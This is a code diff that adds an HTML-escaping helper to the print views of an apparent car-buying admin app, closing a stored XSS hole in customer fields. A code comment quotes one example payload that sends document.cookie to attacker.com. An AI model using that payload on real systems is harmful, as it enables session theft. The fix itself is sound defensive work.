@@ -58,13 +58,28 @@ const basePrintCSS = [
 ].join("\n");
 
 // ── Helpers ──
+// HTML-escape any string before interpolating into the print HTML to prevent
+// stored XSS via customer-supplied fields (name, email, VIN, plate, address,
+// notes). Without this, a malicious value like
+// `<img src=x onerror=fetch('https://attacker.com?t='+document.cookie)>` would
+// execute JS in the staff print window at the same origin as the admin app.
+const esc = (v: unknown): string => {
+  if (v === null || v === undefined) return "";
+  return String(v)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+};
+
 const makeRow = (label: string, value: string) =>
-  '<div class="row"><span class="label">' + label + '</span><span class="value">' + value + "</span></div>";
+  '<div class="row"><span class="label">' + esc(label) + '</span><span class="value">' + esc(value) + "</span></div>";
 
 const makeSection = (title: string, rows: [string, string | null | undefined][]) => {
   const valid = rows.filter(([, v]) => v != null && v !== "" && v !== "none");
   if (valid.length === 0) return "";
-  return '<div class="section"><div class="section-title">' + title + '</div><div class="grid">' +
+  return '<div class="section"><div class="section-title">' + esc(title) + '</div><div class="grid">' +
     valid.map(([l, v]) => makeRow(l, v!)).join("") + "</div></div>";
 };
 
@@ -72,10 +87,10 @@ const arrVal = (a: string[] | null) =>
   a && a.length > 0 && !(a.length === 1 && a[0] === "none") ? a.join(", ") : null;
 
 const makeDocSection = (title: string, images: string[]) =>
-  images.length > 0 ? `<div class="doc-section"><h2>${title}</h2>${images.map(url => `<img class="doc-img" src="${url}" />`).join("")}</div>` : "";
+  images.length > 0 ? `<div class="doc-section"><h2>${esc(title)}</h2>${images.map(url => `<img class="doc-img" src="${esc(url)}" />`).join("")}</div>` : "";
 
 const makeTextDocSection = (title: string, text: string) =>
-  text ? `<div class="doc-section"><h2>${title}</h2><pre style="white-space:pre-wrap;font-family:Inter,-apple-system,sans-serif;font-size:13px;color:#1a2a3a;background:#f8fafc;border:1px solid #e2e6ea;border-radius:8px;padding:16px;line-height:1.6;">${text}</pre></div>` : "";
+  text ? `<div class="doc-section"><h2>${esc(title)}</h2><pre style="white-space:pre-wrap;font-family:Inter,-apple-system,sans-serif;font-size:13px;color:#1a2a3a;background:#f8fafc;border:1px solid #e2e6ea;border-radius:8px;padding:16px;line-height:1.6;">${esc(text)}</pre></div>` : "";
 
 const waitAndPrint = (win: Window, html: string) => {
   win.document.write(html);
@@ -151,11 +166,11 @@ export function printSubmissionDetail(
 
   const photosHtml = photos.length > 0
     ? '<div class="section"><div class="section-title">Photos (' + photos.length + ')</div><div class="photos-grid">' +
-      photos.map(p => '<img src="' + p.url + '" />').join("") + "</div></div>"
+      photos.map(p => '<img src="' + esc(p.url) + '" />').join("") + "</div></div>"
     : "";
 
   const notesHtml = s.internal_notes
-    ? '<div class="section"><div class="section-title">Internal Notes</div><div class="notes">' + s.internal_notes + "</div></div>"
+    ? '<div class="section"><div class="section-title">Internal Notes</div><div class="notes">' + esc(s.internal_notes) + "</div></div>"
     : "";
 
   const priceSection = s.offered_price
@@ -174,15 +189,15 @@ export function printSubmissionDetail(
           const isPdf = u.includes(".pdf");
           return isPdf
             ? '<p style="font-size:13px;color:#4a5568;">[PDF Document]</p>'
-            : '<img class="doc-img" src="' + u + '" />';
+            : '<img class="doc-img" src="' + esc(u) + '" />';
         }).join("");
-        return '<div class="doc-section"><div class="section"><div class="section-title">' + label + '</div>' + images + '</div></div>';
+        return '<div class="doc-section"><div class="section"><div class="section-title">' + esc(label) + '</div>' + images + '</div></div>';
       }).join("")
     : "";
 
   const html = "<!DOCTYPE html><html><head><title>Submission Details</title><style>" + css + "</style></head><body>" +
-    '<div class="header"><h1>' + (vehicleStr || "Submission Details") + "</h1>" +
-    "<p>Submitted " + new Date(s.created_at).toLocaleDateString() + " &bull; " + (s.name || "Unknown") + "</p></div>" +
+    '<div class="header"><h1>' + esc(vehicleStr || "Submission Details") + "</h1>" +
+    "<p>Submitted " + esc(new Date(s.created_at).toLocaleDateString()) + " &bull; " + esc(s.name || "Unknown") + "</p></div>" +
     '<div class="content">' +
     makeSection("Contact Information", [["Name", s.name], ["Phone", formatPhone(s.phone)], ["Email", s.email], ["ZIP", s.zip], ["Address", [s.address_street, s.address_city, s.address_state, s.zip].filter(Boolean).join(", ") || null]]) +
     makeSection("Vehicle Details", [
@@ -200,7 +215,7 @@ export function printSubmissionDetail(
     makeSection("Loan & Info", [["Loan Status", s.loan_status], ["Next Step", s.next_step]]) +
     '<div class="section"><div class="section-title">Appointment</div><p style="font-size:13px;color:#4a5568;">' +
       (s.appointment_set && s.appointment_date
-        ? new Date(s.appointment_date + "T12:00:00").toLocaleDateString("en-US", { weekday: "long", year: "numeric", month: "long", day: "numeric" })
+        ? esc(new Date(s.appointment_date + "T12:00:00").toLocaleDateString("en-US", { weekday: "long", year: "numeric", month: "long", day: "numeric" }))
         : "No appointment yet") +
     '</p></div>' +
     '<div class="section"><div class="section-title">Acquisition Tracker</div>' + progressHtml + "</div>" +
@@ -209,7 +224,7 @@ export function printSubmissionDetail(
     photosHtml +
     docsHtml +
     '<div class="section"><div class="section-title">Customer Documents Upload Link</div>' +
-    '<p style="font-size:13px;color:#4a5568;word-break:break-all;">' + docsUrl + "</p></div>" +
+    '<p style="font-size:13px;color:#4a5568;word-break:break-all;">' + esc(docsUrl) + "</p></div>" +
     "</div></body></html>";
 
   const printWindow = window.open("", "_blank", "width=800,height=600");
@@ -237,8 +252,8 @@ export function printAllDocs(
     "@page { margin: 0.75in; size: letter; }",
   ].join("\n");
 
-  const html = `<!DOCTYPE html><html><head><title>Customer Documents – ${customerName || vehicleStr}</title><style>${css}</style></head><body>
-    <div class="header"><h1>Customer Documents</h1><p>${customerName || ""} — ${vehicleStr}</p></div>
+  const html = `<!DOCTYPE html><html><head><title>Customer Documents – ${esc(customerName || vehicleStr)}</title><style>${css}</style></head><body>
+    <div class="header"><h1>Customer Documents</h1><p>${esc(customerName || "")} — ${esc(vehicleStr)}</p></div>
     ${docSections.map(s => makeDocSection(s.title, s.images)).join("")}
   </body></html>`;
 
@@ -279,22 +294,22 @@ export function printCheckRequest(
   ].join("\n");
 
   const html = `<!DOCTYPE html><html><head><title>Check Request</title><style>${css}</style></head><body>
-    <div class="header">${logoBase64 ? `<img src="${logoBase64}" alt="Logo" />` : `<h1 style="font-size:22px;font-weight:700;">Check Request</h1>`}<p>Check Request Form</p></div>
+    <div class="header">${logoBase64 ? `<img src="${esc(logoBase64)}" alt="Logo" />` : `<h1 style="font-size:22px;font-weight:700;">Check Request</h1>`}<p>Check Request Form</p></div>
     <div class="content">
       <p class="title">Check Request</p>
       <table>
-        <tr><th>Date</th><td>${today}</td></tr>
-        <tr><th>Customer Name (As It Appears on Title)</th><td>${s.name || ""}</td></tr>
-        <tr><th>Address</th><td>${[s.address_street, s.address_city, s.address_state, s.zip].filter(Boolean).join(", ")}</td></tr>
-        <tr><th>City, State, Zip</th><td>${[s.address_city, s.address_state, s.zip].filter(Boolean).join(", ") || ""}</td></tr>
-        <tr><th>Contact Phone</th><td>${formatPhone(s.phone)}</td></tr>
-        <tr><th>Contact Email</th><td>${s.email || ""}</td></tr>
+        <tr><th>Date</th><td>${esc(today)}</td></tr>
+        <tr><th>Customer Name (As It Appears on Title)</th><td>${esc(s.name || "")}</td></tr>
+        <tr><th>Address</th><td>${esc([s.address_street, s.address_city, s.address_state, s.zip].filter(Boolean).join(", "))}</td></tr>
+        <tr><th>City, State, Zip</th><td>${esc([s.address_city, s.address_state, s.zip].filter(Boolean).join(", ") || "")}</td></tr>
+        <tr><th>Contact Phone</th><td>${esc(formatPhone(s.phone))}</td></tr>
+        <tr><th>Contact Email</th><td>${esc(s.email || "")}</td></tr>
         <tr><th>Agreed Upon Value (Check Amount)</th><td class="amount">$${s.offered_price!.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td></tr>
         <tr><th>In-House ACV (Actual Cash Value)</th><td class="acv">${s.acv_value ? "$" + s.acv_value.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : "N/A"}</td></tr>
         <tr><th>Description</th><td style="font-weight:600;">Customer Direct Inventory Purchase</td></tr>
-        <tr><th>Vehicle</th><td>${vehicleStr}</td></tr>
-        <tr><th>VIN</th><td>${s.vin || "N/A"}</td></tr>
-        <tr><th>Mileage</th><td>${s.mileage || "N/A"}</td></tr>
+        <tr><th>Vehicle</th><td>${esc(vehicleStr)}</td></tr>
+        <tr><th>VIN</th><td>${esc(s.vin || "N/A")}</td></tr>
+        <tr><th>Mileage</th><td>${esc(s.mileage || "N/A")}</td></tr>
       </table>
       <div class="sig-section">
         <div class="sig-line">GSM / GM Signature</div>
